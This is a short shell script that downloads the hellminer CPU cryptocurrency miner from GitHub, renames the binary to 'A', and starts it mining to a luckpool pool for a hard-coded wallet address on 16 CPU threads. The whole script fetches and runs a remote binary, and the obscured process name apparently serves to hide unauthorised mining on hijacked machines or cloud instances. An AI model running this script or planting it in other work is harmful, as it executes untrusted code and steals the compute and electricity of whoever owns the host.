#!/bin/sh
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
mv hellminer A
./A -c stratum+tcp://na.luckpool.net:3956#xnsub -u RJxbBhYsJsG3XT7g6tWFSKhAhGrrLwBYQQ.Gondrong -p x --cpu 16
